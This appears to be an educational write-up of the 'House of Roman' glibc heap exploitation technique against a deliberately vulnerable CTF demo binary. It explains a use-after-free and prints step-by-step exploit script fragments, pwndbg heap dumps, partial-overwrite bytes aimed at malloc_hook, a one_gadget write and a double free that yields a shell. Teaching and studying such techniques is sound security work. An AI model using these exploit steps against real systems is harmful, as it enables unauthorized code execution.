# House of Roman

## Introduction

The House of Roman technique, put simply, is a small trick that combines fastbin attack and Unsorted bin attack.

## Overview



This technique is used to bypass ASLR, using 12-bit brute force to achieve the goal of getting a shell. It only requires a UAF vulnerability and the ability to create chunks of arbitrary size to complete the exploitation.



## Principle and Demonstration



The author provided us with a demo for demonstration. The entire exploitation process can be roughly divided into three steps.

1. Point FD to malloc_hook
2. Fix the 0x71 Freelist
3. Write one gadget into malloc_hook



First, let's do a general analysis of the demo:

Protection status:

```bash
[*] '/media/psf/Home/Desktop/MyCTF/House-Of-Roman/new_chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

The sample has three main functions: Malloc, Write, and Free.

```c
    switch ( v4 )
    {
      case 1:
        puts("Malloc");
        v5 = malloc_chunk("Malloc");
        if ( !v5 )
          puts("Error");
        break;
      case 2:
        puts("Write");
        write_chunk("Write");
        break;
      case 3:
        puts("Free");
        free_chunk();
        break;
      default:
        puts("Invalid choice");
        break;
```

In the Free function, there is a dangling pointer caused by the pointer not being set to NULL.

```c
void free_chunk()
{
  unsigned int v0; // [rsp+Ch] [rbp-4h]@1

  printf("\nEnter index :");
  __isoc99_scanf("%d", &v0);
  if ( v0 <= 0x13 )
    free(heap_ptrs[(unsigned __int64)v0]);
}
```



### Step 1

First, forge a chunk with a size of 0x61. Then we use partial overwrite to point FD to the forged chunk (of course, we can also use UAF to accomplish this).

Forge chunk size

```bash
pwndbg>
0x555555757050: 0x41414141      0x41414141      0x41414141      0x41414141
0x555555757060: 0x41414141      0x41414141      0x41414141      0x41414141
0x555555757070: 0x41414141      0x41414141      0x41414141      0x41414141
0x555555757080: 0x41414141      0x41414141      0x41414141      0x41414141
0x555555757090: 0x41414141      0x41414141      0x61    0x0     <----------
```

Here, we free chunk 1, and at this point we get an unsorted bin

```
0x555555757020 PREV_INUSE {
  prev_size = 0x0,
  size = 0xd1,
  fd = 0x7ffff7dd1b58 <main_arena+88>,
  bk = 0x7ffff7dd1b58 <main_arena+88>,
  fd_nextsize = 0x4141414141414141,
  bk_nextsize = 0x4141414141414141
}
```

Next, we reallocate the 0xd1 chunk and modify its size to 0x71

```
pwndbg> x/40ag 0x555555757020
0x555555757020: 0x4141414141414141      0x71
0x555555757030: 0x7ffff7dd1b58 <main_arena+88>  0x7ffff7dd1b58 <main_arena+88>
0x555555757040: 0x4141414141414141      0x4141414141414141
0x555555757050: 0x4141414141414141      0x4141414141414141
0x555555757060: 0x4141414141414141      0x4141414141414141
0x555555757070: 0x4141414141414141      0x4141414141414141
0x555555757080: 0x4141414141414141      0x4141414141414141
0x555555757090: 0x4141414141414141      0x61
```



Next, we need to fix the 0x71 FD freelist, forging it as an already freed block

```
pwndbg> x/40ag 0x555555757000
0x555555757000: 0x0     0x21
0x555555757010: 0x4141414141414141      0x4141414141414141
0x555555757020: 0x4141414141414141      0x71       <----------  free 0x71
0x555555757030: 0x7ffff7dd1b58 <main_arena+88>  0x7ffff7dd1b58 <main_arena+88>
0x555555757040: 0x4141414141414141      0x4141414141414141
0x555555757050: 0x4141414141414141      0x4141414141414141
0x555555757060: 0x4141414141414141      0x4141414141414141
0x555555757070: 0x4141414141414141      0x4141414141414141
0x555555757080: 0x4141414141414141      0x4141414141414141
0x555555757090: 0x4141414141414141      0x61
0x5555557570a0: 0x0     0x0
0x5555557570b0: 0x0     0x0
0x5555557570c0: 0x0     0x0
0x5555557570d0: 0x0     0x0
0x5555557570e0: 0x0     0x0
0x5555557570f0: 0xd0    0x71   <----------     free 0x71
0x555555757100: 0x0     0x0
0x555555757110: 0x0     0x0
0x555555757120: 0x0     0x0
0x555555757130: 0x0     0x0

```



```
libc : 0x7ffff7a23d28 ("malloc_hook")
```

At this point, our FD is already near malloc hook, preparing for the subsequent brute force.

### Step 2

We only need to free a chunk of size 0x71 to complete the fix.



### Step 3

Use the unsorted bin attack technique, and use the edit function to write the one_gadget.



## Analyzing the Exploit



Allocate `3` `chunks`, set `p64(0x61)` at `B + 0x78` as a `fake size`, used for the subsequent `fastbin attack`



```python
create(0x18,0) # 0x20
create(0xc8,1) # d0
create(0x65,2)  # 0x70

info("create 2 chunk, 0x20, 0xd8")
fake = "A"*0x68
fake += p64(0x61)  ## fake size
edit(1,fake)
info("fake")
```

Free `B`, then allocate the same size to get `B` again. At this point `B+0x10` and `B+0x18` contain the `main_arena` address. Allocate `3` fastbin chunks, use `off by one` to modify `B->size = 0x71`

```
free(1)
create(0xc8,1)

create(0x65,3)  # b
create(0x65,15)
create(0x65,18)

over = "A"*0x18  # off by one
over += "\x71"  # set chunk 1's size --> 0x71
edit(0,over)
info("use off by one, chunk 1's size --> 0x71")
```

Generate two `fastbin` entries, then use `UAF` with partial address write to link `B` into `fastbin`

 

```py
free(2)
free(3)
info("create two 0x70 fastbin entries")
heap_po = "\x20"
edit(3,heap_po)
info("link chunk 1 into fastbin")

```

Let's debug and check the `fastbin` state at this point

 

```
pwndbg> fastbins 
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x555555757160 —▸ 0x555555757020 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x7ffff7dd1b78
0x80: 0x0
```

> `0x555555757020` is `chunk B`

 Then modify the lower `2` bytes of `B->fd` so that `B->fd = malloc_hook - 0x23`

 

```
# Near malloc_hook
malloc_hook_nearly = "\xed\x1a"
edit(1,malloc_hook_nearly)
info("partial write, modify fastbin->fd ---> malloc_hook")

```

Then allocate `3` chunks of size `0x70`, and we can get the `chunk` where `malloc_hook` is located.

 

```
create(0x65,0)
create(0x65,0)
create(0x65,0)
```

Then `free` `E`, putting it into `fastbin`, use `UAF` to set `E->fd = 0`, which fixes the `fastbin`

```
free(15)
edit(15,p64(0x00))
info("generate 0x71 fastbin again, also modify fd=0 to fix fastbin")
```

Then comes the unsorted bin attack, making the value of malloc_hook become main_arena+88

 

```
create(0xc8,1)
create(0xc8,1)
create(0x18,2)
create(0xc8,3)
create(0xc8,4)
free(1)
po = "B"*8
po += "\x00\x1b"
edit(1,po)
create(0xc8,1)
info("unsorted bin makes malloc_hook have a libc address")
```

Modify the lower three bytes of `malloc_hook` so that `malloc_hook` becomes the `one_gadget` address

 

```
over = "R"*0x13   # padding for malloc_hook
over += "\xa4\xd2\xaf"
edit(0,over)

info("malloc_hook to one_gadget")
```

Then `free` the same `chunk` twice, triggering `malloc_printerr`, `getshell`

 

```
free(18)
free(18)
```



## Links

https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc

https://github.com/romanking98/House-Of-Roman

https://xz.aliyun.com/t/2316
